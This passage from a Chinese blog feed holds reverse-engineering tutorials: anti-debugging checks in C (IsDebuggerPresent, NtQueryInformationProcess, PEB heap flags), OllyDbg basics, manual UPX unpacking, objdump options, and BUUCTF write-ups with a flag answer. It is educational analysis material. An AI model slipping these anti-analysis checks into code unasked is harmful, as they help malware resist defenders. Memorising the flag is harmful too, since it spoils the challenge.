style="zoom:50%;" /><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230519073336091.png" alt="image-20230519073336091"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OD反调试：过程序调式保护技术（22）</title>
      <link href="/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-22-OD%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95%EF%BC%9A%E8%BF%87%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-22-OD%E4%B9%8B%E5%8F%8D%E8%B0%83%E8%AF%95%EF%BC%9A%E8%BF%87%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1><p>首先可以看这个文章，肯定比我讲得好。</p><p><a href="https://bbs.kanxue.com/thread-225740.htm">https://bbs.kanxue.com/thread-225740.htm</a></p><hr><p>我下面写的东西，也是转载的啦。【方便以后自己找和看】</p><p>反调试技术，恶意代码用它识别是否被调试，或者让调试器失效。恶意代码编写者意识到分析人员经常使用调试器来观察恶意代码的操作，因此他们使用反调试技术尽可能地延长恶意代码的分析时间。为了阻止调试器的分析，当恶意代码意识到自己被调试时，它们可能改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试时间和复杂度。很多种反调试技术可以达到反调试效果。这里介绍当前常用的几种反调试技术，同时也会介绍一些逃避反调试的技巧。</p><p>反调试主要就是函数在操作【包括微软未公开的函数】</p><h2 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" title="IsDebuggerPresent"></a>IsDebuggerPresent</h2><p>IsDebuggerPresent查询进程环境块【PEB】中的IsDebugged标志。如果进程没有运行在调试器中，函数返回0；如果调试附加了进程，函数返回一个非0值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">return IsDebuggerPresent();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent"></a>CheckRemoteDebuggerPresent</h2><p>CheckRemoteDebuggerPresent同IsDebuggerPresent几乎一致。它不仅可以探测系统其他进程是否被调试，通过传递自身进程句柄还可以探测自身是否被调试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">BOOL ret;</span><br><span class="line">CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);</span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess"></a>NtQueryInformationProcess</h2><p><strong>NtQueryInformationProcess</strong></p><p>这个函数是Ntdll.dll中一个原生态API，它用来提取一个给定进程的信息。它的第一个参数是进程句柄，第二个参数告诉我们它需要提取进程信息的类型。为第二个参数指定特定值并调用该函数，相关信息就会设置到第三个参数。第二个参数是一个枚举类型，其中与反调试有关的成员有ProcessDebugPort(0x7)、ProcessDebugObjectHandle(0x1E)和ProcessDebugFlags(0x1F)。例如将该参数置为ProcessDebugPort，如果进程正在被调试，则返回调试端口，否则返回0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">int debugPort = 0;</span><br><span class="line">HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);</span><br><span class="line">NtQueryInformationProcessPtr NtQueryInformationProcess =</span><br><span class="line">(NtQueryInformationProcessPtr)GetProcAddress(hModule,</span><br><span class="line">&quot;NtQueryInformationProcess&quot;);</span><br><span class="line">NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort,</span><br><span class="line">sizeof(debugPort), NULL);</span><br><span class="line">return debugPort != 0;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">HANDLE hdebugObject = NULL;</span><br><span class="line">HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);</span><br><span class="line">NtQueryInformationProcessPtr NtQueryInformationProcess =</span><br><span class="line">(NtQueryInformationProcessPtr)GetProcAddress(hModule,</span><br><span class="line">&quot;NtQueryInformationProcess&quot;);</span><br><span class="line">NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;hdebugObject,</span><br><span class="line">sizeof(hdebugObject), NULL);</span><br><span class="line">return hdebugObject != NULL;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">BOOL bdebugFlag = TRUE;</span><br><span class="line">HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);</span><br><span class="line">NtQueryInformationProcessPtr NtQueryInformationProcess =</span><br><span class="line">(NtQueryInformationProcessPtr)GetProcAddress(hModule,</span><br><span class="line">&quot;NtQueryInformationProcess&quot;);</span><br><span class="line">NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;bdebugFlag,</span><br><span class="line">sizeof(bdebugFlag), NULL);</span><br><span class="line">return bdebugFlag != TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GetLastError"><a href="#GetLastError" class="headerlink" title="GetLastError"></a>GetLastError</h2><p>编写应用程序时，经常需要涉及到错误处理问题。许多函数调用只用TRUE和FALSE来表明函数的运行结果。一旦出现错误，MSDN中往往会指出请用GetLastError()函数来获得错误原因。恶意代码可以使用异常来破坏或者探测调试器。调试器捕获异常后，并不会立即将处理权返回被调试进程处理，大多数利用异常的反调试技术往往据此来检测调试器。多数调试器默认的设置是捕获异常后不将异常传递给应用程序。如果调试器不能将异常结果正确返回到被调试进程，那么这种异常失效可以被进程内部的异常处理机制探测。</p><p>对于OutputDebugString函数，它的作用是在调试器中显示一个字符串，同时它也可以用来探测调试器的存在。使用SetLastError函数，将当前的错误码设置为一个任意值。如果进程没有被调试器附加，调用OutputDebugString函数会失败，错误码会重新设置，因此GetLastError获取的错误码应该不是我们设置的任意值。但如果进程被调试器附加，调用OutputDebugString函数会成功，这时GetLastError获取的错误码应该没改变。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">DWORD errorValue = 12345;</span><br><span class="line">SetLastError(errorValue);</span><br><span class="line">OutputDebugString(&quot;Test for debugger!&quot;);</span><br><span class="line">if (GetLastError() == errorValue)</span><br><span class="line">&#123;</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于DeleteFiber函数，如果给它传递一个无效的参数的话会抛出ERROR_INVALID_PARAMETER异常。如果进程正在被调试的话，异常会被调试器捕获。所以，同样可以通过验证LastError值来检测调试器的存在。如代码所示，0x57就是指ERROR_INVALID_PARAMETER。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">char fib[1024] = &#123; 0 &#125;;</span><br><span class="line">DeleteFiber(fib);</span><br><span class="line">return (GetLastError() != 0x57);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样还可以使用CloseHandle、CloseWindow产生异常，使得错误码改变</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">DWORD ret = CloseHandle((HANDLE)0x1234);</span><br><span class="line">if (ret != 0 || GetLastError() != ERROR_INVALID_HANDLE)</span><br><span class="line">&#123;</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">DWORD ret = CloseWindow((HWND)0x1234);</span><br><span class="line">if (ret != 0 || GetLastError() != ERROR_INVALID_WINDOW_HANDLE)</span><br><span class="line">&#123;</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ZwSetInformationThread"><a href="#ZwSetInformationThread" class="headerlink" title="ZwSetInformationThread"></a>ZwSetInformationThread</h2><p>ZwSetInformationThread拥有两个参数，第一个参数用来接收当前线程的句柄，第二个参数表示线程信息类型，若其值设置为ThreadHideFromDebugger(0x11)，使用语句ZwSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, NULL, 0);调用该函数后，调试进程就会被分离出来。该函数不会对正常运行的程序产生任何影响，但若运行的是调试器程序，因为该函数隐藏了当前线程，调试器无法再收到该线程的调试事件，最终停止调试。还有一个函数DebugActiveProcessStop用来分离调试器和被调试进程，从而停止调试。两个API容易混淆，需要牢记它们的区别。</p><h2 id="手动检测数据结构"><a href="#手动检测数据结构" class="headerlink" title="手动检测数据结构"></a>手动检测数据结构</h2><p>虽然使用Windows API是探测调试器存在的最简单办法，但手动检查数据结构是恶意代码编写者最常使用的办法。这是因为很多时候通过Windows API实现的反调试技术无效，例如这些API函数被rootkit挂钩，并返回错误信息。因此，恶意代码编写者经常手动执行与这些API功能相同的操作。在手动检测中，PEB结构中的一些标志暴露了调试器存在的信息。这里，我们关注检测调试器存在常用的一些标志。</p><h2 id="检测BeingDebugged属性"><a href="#检测BeingDebugged属性" class="headerlink" title="检测BeingDebugged属性"></a>检测BeingDebugged属性</h2><p>Windows操作系统维护着每个正在运行的进程的PEB结构，它包含与这个进程相关的所有用户态参数。这些参数包括进程环境数据，环境数据包括环境变量、加载的模块列表、内存地址，以及调试器状态。</p><h2 id="检测ProcessHeap属性"><a href="#检测ProcessHeap属性" class="headerlink" title="检测ProcessHeap属性"></a>检测ProcessHeap属性</h2><p>Reserved数组中一个未公开的位置叫作ProcessHeap，它被设置为加载器为进程分配的第一个堆的位置。ProcessHeap位于PEB结构的0x18处。第一个堆头部有一个属性字段，它告诉核这个堆是否在调试器中创建。这些属性叫作ForceFlags和Flags。在Windows XP系统中，ForceFlags属性位于堆头部偏移量0x10处；在Windows 7系统中，对于32位的应用程序来说ForceFlags属性位于堆头部偏移量0x44处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckDebug()</span><br><span class="line">&#123;</span><br><span class="line">int result = 0;</span><br><span class="line">DWORD dwVersion = GetVersion();</span><br><span class="line">DWORD dwWindowsMajorVersion = (DWORD)(LOBYTE(LOWORD(dwVersion)));</span><br><span class="line">//for xp</span><br><span class="line">if (dwWindowsMajorVersion == 5)</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, fs: [30h]</span><br><span class="line">mov eax, [eax + 18h]</span><br><span class="line">mov eax, [eax + 10h]</span><br><span class="line">mov result, eax</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, fs: [30h]</span><br><span class="line">mov eax, [eax + 18h]</span><br><span class="line">mov eax, [eax + 44h]</span><br><span class="line">mov result, eax</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return result != 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OD 有插件</p><p>当我们遇到一些常见的反调试API可以直接nop掉它，一般的话会加时钟检测，我们可以用pchunter移除程序时钟等等等。我们了解一下反调试技术就行了，现在基本很少会出现反调试，因为差不多玩不出花样，现在的难度都在程序虚拟机保护上。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OD介绍和基本操作（21）</title>
      <link href="/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-21-OD%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/05/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-21-OD%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="OD介绍和基本的操作"><a href="#OD介绍和基本的操作" class="headerlink" title="OD介绍和基本的操作"></a>OD介绍和基本的操作</h1><p>一个动态调试的反汇编工具</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518160143000.png" alt="image-20230518160143000" style="zoom:50%;" /><p>这个是打开后的样子，上面有选型，下边有几个不同作用的窗口。我们尝试把一个文件放进去看看。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518160450558.png" alt="image-20230518160450558"></p><p>首先是上面的地方，有文件，插件….</p><p>下面有一个【暂停】字样，这个来看程序是运行的还是暂停的，然后右边有2个黑色的三角形是重新加载程序，X是退出。</p><p>红色的三角形是运行程序，后面带有箭头和好几个点的是运行程序，每一个意思不一样，单步运行啊，单步步过啊。。。啥的</p><p>后面一串洋文的东西，就是一系列窗口，说不明白，还得自己多尝试</p><p>中间是汇编的主要的窗口，右边是寄存器窗口，左下是数据的窗口，在主窗口和数据窗口中还有一个小的窗口，右下是栈窗口。</p><p>上面那个插件蛮好用的。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518160943254.png" alt="image-20230518160943254" style="zoom:50%;" /><p>蛮多的。</p><p>功能不介绍【主要我也不知道】</p><p>我知道一个API断点设置工具</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518161039183.png" alt="image-20230518161039183" style="zoom:50%;" /><p>主要就是对于不同的API函数进行设置断点的工具。</p><p>主要还是得靠实际操作。</p><hr><h1 id="去除花指令"><a href="#去除花指令" class="headerlink" title="去除花指令"></a>去除花指令</h1><p>花指令就是恶心别人。加一些没用的东西。</p><p>可以用OD中的插件去除啦。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518161821473.png" alt="image-20230518161821473"></p><p>找到含有花指令函数的头部，然后选中它，点击插件里面的DeJunk 就可以去掉了</p><h1 id="脱壳之：ESP定律去除OEP"><a href="#脱壳之：ESP定律去除OEP" class="headerlink" title="脱壳之：ESP定律去除OEP"></a>脱壳之：ESP定律去除OEP</h1><p>啥是OEP？</p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230518162053514.png" alt="image-20230518162053514" style="zoom:50%;" /><p>这里实战一下啦</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518162410809.png" alt="image-20230518162410809"></p><p>可以看到，这个程序有一个UPX的壳.</p><p>咋说呢…</p><p>这里有一个UPX自动脱壳的工具</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518162839734.png" alt="image-20230518162839734" style="zoom:50%;" /><p>这样就脱壳了。但是不够优雅</p><p>我们用OD的esp定律来手动脱壳</p><p>进入软件，F8单步</p><p>当esp变成红色</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518163355348.png" alt="image-20230518163355348" style="zoom:50%;" /><p>找到第一个数据的地方，右键-断点-硬件访问-Word</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518163318315.png" alt="image-20230518163318315" style="zoom:50%;" /><p>F9跑起来啦</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518163529066.png" alt="image-20230518163529066" style="zoom:50%;" /><p>到这里，下面这个jmp 跳转就是程序入口的地方。</p><p>然后在黑色窗口输入一点东西，然后继续F9</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518163823417.png" alt="image-20230518163823417" style="zoom:50%;" /><p>现在就是跳到了程序真的入口点</p><p>插件OllyDump</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518164155517.png" alt="image-20230518164155517" style="zoom:50%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230518164233713.png" alt="image-20230518164233713" style="zoom:50%;" /><p>ok </p><p>这样就无壳了</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-reverse_1（2）</title>
      <link href="/2023/05/17/Re%E5%88%B7%E9%A2%98%E5%92%AF-2-BUU-reverse-1/"/>
      <url>/2023/05/17/Re%E5%88%B7%E9%A2%98%E5%92%AF-2-BUU-reverse-1/</url>
      
        <content type="html"><![CDATA[<h5 id="首先我们下载这个-exe"><a href="#首先我们下载这个-exe" class="headerlink" title="首先我们下载这个.exe"></a>首先我们下载这个.exe</h5><h5 id="下载之后用ida打开，在这之前其实需要脱壳【不懂】"><a href="#下载之后用ida打开，在这之前其实需要脱壳【不懂】" class="headerlink" title="下载之后用ida打开，在这之前其实需要脱壳【不懂】"></a>下载之后用ida打开，在这之前其实需要脱壳【不懂】</h5><h5 id="反正就是用ida×64打开"><a href="#反正就是用ida×64打开" class="headerlink" title="反正就是用ida×64打开"></a>反正就是用ida×64打开</h5><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230413113656896.png" alt="image-20230413113656896" style="zoom: 33%;" /><h5 id="这里他提示说：有一个相关的pdb文件，是否要上传"><a href="#这里他提示说：有一个相关的pdb文件，是否要上传" class="headerlink" title="这里他提示说：有一个相关的pdb文件，是否要上传"></a>这里他提示说：有一个相关的pdb文件，是否要上传</h5><h5 id="其实没有-，所以点否。也可以点是，反正就是没有罢了"><a href="#其实没有-，所以点否。也可以点是，反正就是没有罢了" class="headerlink" title="其实没有 ，所以点否。也可以点是，反正就是没有罢了"></a>其实没有 ，所以点否。也可以点是，反正就是没有罢了</h5><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230413113921221.png" alt="image-20230413113921221" style="zoom: 33%;" /><h5 id="打开过后就是这样，emmm毫无头绪，怎么办呢？"><a href="#打开过后就是这样，emmm毫无头绪，怎么办呢？" class="headerlink" title="打开过后就是这样，emmm毫无头绪，怎么办呢？"></a>打开过后就是这样，emmm毫无头绪，怎么办呢？</h5><h5 id="没有思路肯定就是要去所有的东西啦【shift-F12】【也可以在视图-打开子视图-字串】里面找到哦"><a href="#没有思路肯定就是要去所有的东西啦【shift-F12】【也可以在视图-打开子视图-字串】里面找到哦" class="headerlink" title="没有思路肯定就是要去所有的东西啦【shift+F12】【也可以在视图-打开子视图-字串】里面找到哦"></a>没有思路肯定就是要去所有的东西啦【shift+F12】【也可以在视图-打开子视图-字串】里面找到哦</h5><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230413114307857.png" alt="image-20230413114307857" style="zoom:33%;" /><h5 id="我们肯定是要找flag啦，这里有三个……-【我也是小白也不懂，先打开这个wrong-flag-】看看吧"><a href="#我们肯定是要找flag啦，这里有三个……-【我也是小白也不懂，先打开这个wrong-flag-】看看吧" class="headerlink" title="我们肯定是要找flag啦，这里有三个…….【我也是小白也不懂，先打开这个wrong flag 】看看吧"></a>我们肯定是要找flag啦，这里有三个…….【我也是小白也不懂，先打开这个wrong flag 】看看吧</h5><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230413114530086.png" alt="image-20230413114530086" style="zoom:50%;" /><h5 id="这说明这个-wrong-flag-这个字符串是存放在内存中的，emmm"><a href="#这说明这个-wrong-flag-这个字符串是存放在内存中的，emmm" class="headerlink" title="这说明这个 wrong flag 这个字符串是存放在内存中的，emmm"></a>这说明这个 wrong flag 这个字符串是存放在内存中的，emmm</h5><h5 id="这里就去看看谁引用了这个wrong-flag吧【这里是用的“交叉引用”-右键-点击-或者用ctrl-x】"><a href="#这里就去看看谁引用了这个wrong-flag吧【这里是用的“交叉引用”-右键-点击-或者用ctrl-x】" class="headerlink" title="这里就去看看谁引用了这个wrong flag吧【这里是用的“交叉引用” 右键-点击   或者用ctrl+x】"></a>这里就去看看谁引用了这个wrong flag吧【这里是用的“交叉引用” 右键-点击   或者用ctrl+x】</h5><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230413114756665.png" alt="image-20230413114756665" style="zoom: 33%;" /><h5 id="打开过后是这样的一个东西【这样的一看就是汇编啦】"><a href="#打开过后是这样的一个东西【这样的一看就是汇编啦】" class="headerlink" title="打开过后是这样的一个东西【这样的一看就是汇编啦】"></a>打开过后是这样的一个东西【这样的一看就是汇编啦】</h5><h5 id="所以我们就用-Tab-键-来看伪代码咯-【F5】"><a href="#所以我们就用-Tab-键-来看伪代码咯-【F5】" class="headerlink" title="所以我们就用 Tab 键 来看伪代码咯  【F5】"></a>所以我们就用 Tab 键 来看伪代码咯  【F5】</h5><h5 id="它有一个提示：反正就会说可能会有误差啥的-不管他"><a href="#它有一个提示：反正就会说可能会有误差啥的-不管他" class="headerlink" title="它有一个提示：反正就会说可能会有误差啥的..不管他"></a>它有一个提示：反正就会说可能会有误差啥的..不管他</h5><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230413115016692.png" alt="image-20230413115016692" style="zoom:33%;" /><h5 id="打开就是这样的，读一读咯【这里很类似于C语言】"><a href="#打开就是这样的，读一读咯【这里很类似于C语言】" class="headerlink" title="打开就是这样的，读一读咯【这里很类似于C语言】"></a>打开就是这样的，读一读咯【这里很类似于C语言】</h5><h5 id="然后就是大概的看-里面有printf还有scanf还有if语句，if语句就是说把111【ascii】转化成48【axcii】然后就是正确的flag"><a href="#然后就是大概的看-里面有printf还有scanf还有if语句，if语句就是说把111【ascii】转化成48【axcii】然后就是正确的flag" class="headerlink" title="然后就是大概的看    里面有printf还有scanf还有if语句，if语句就是说把111【ascii】转化成48【axcii】然后就是正确的flag"></a>然后就是大概的看    里面有printf还有scanf还有if语句，if语句就是说把111【ascii】转化成48【axcii】然后就是正确的flag</h5><h5 id="去查看字符串Str2"><a href="#去查看字符串Str2" class="headerlink" title="去查看字符串Str2"></a>去查看字符串Str2</h5><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20230413115354464.png" alt="image-20230413115354464" style="zoom: 50%;" /><h5 id="最后就需要把111改成48就好了"><a href="#最后就需要把111改成48就好了" class="headerlink" title="最后就需要把111改成48就好了"></a>最后就需要把111改成48就好了</h5><h5 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hell0_w0rld&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU-easyre（1）</title>
      <link href="/2023/05/17/Re%E5%88%B7%E9%A2%98%E5%92%AF-1-BUU-easyre/"/>
      <url>/2023/05/17/Re%E5%88%B7%E9%A2%98%E5%92%AF-1-BUU-easyre/</url>
      
        <content type="html"><![CDATA[<p>就是用ida打开后查看</p><p>一下就看到了flag … </p>]]></content>
      
      
      <categories>
          
          <category> BUU-Re题目 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IDA linux下的反编译命令-objdump（20）</title>
      <link href="/2023/05/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-20-linux%E4%B8%8B%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4-objdump/"/>
      <url>/2023/05/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-20-linux%E4%B8%8B%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4-objdump/</url>
      
        <content type="html"><![CDATA[<h1 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h1><p> <em>objdump命令</em>是Linux下的反汇编目标文件或者可执行文件的<em>命令</em>，它以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息。</p><p><em>obj</em>是目标文件的<em>意思</em></p><p>Linux环境下对obj对象文件的分析。其中主要涉及到<code>objdump</code>、<code>ar</code>以及<code>nm</code>三个工具</p><p><a href="https://ivanzz1001.github.io/records/post/linux/2018/04/09/linux-objdump#1-objdump%E5%91%BD%E4%BB%A4">https://ivanzz1001.github.io/records/post/linux/2018/04/09/linux-objdump#1-objdump%E5%91%BD%E4%BB%A4</a></p><p>可以参考上面这个文章啦</p><p>【最近了解到[Binary_Ninja] 这个“二进制忍者” 工具  有时间找一找玩一玩】</p><hr><p>可以使用man查看objdump命令的反汇编功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man objdump </span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517224748604.png" alt="image-20230517224748604" style="zoom:50%;" /><p>在输入 man objdump</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517224839445.png" alt="image-20230517224839445" style="zoom:50%;" /><p>多的一批，</p><p>…. 具体可以去看上面那篇文章啦，中文，还是详细的嘞【好想copy过来】</p><h2 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump [参数] [文件] </span><br></pre></td></tr></table></figure><h2 id="常用的参数说明"><a href="#常用的参数说明" class="headerlink" title="常用的参数说明"></a>常用的参数说明</h2><ul><li><p>-f 显示文件头信息</p></li><li><p>-D 反汇编所有section (-d反汇编特定section)</p></li><li><p>-h 显示目标文件各个section的头部摘要信息</p></li><li><p>-x 显示所有可用的头信息，包括符号表、重定位入口。-x 等价于 -a -f -h -r -t 同时指定。</p></li><li><p>-i 显示对于 -b 或者 -m 选项可用的架构和目标格式列表。</p></li><li><p>-r 显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。</p></li><li><p>-R 显示文件的动态重定位入口，仅仅对于动态目标文件有意义，比如某些共享库。</p></li><li><p>-S 尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。</p></li><li><p>-t 显示文件的符号表入口。类似于nm 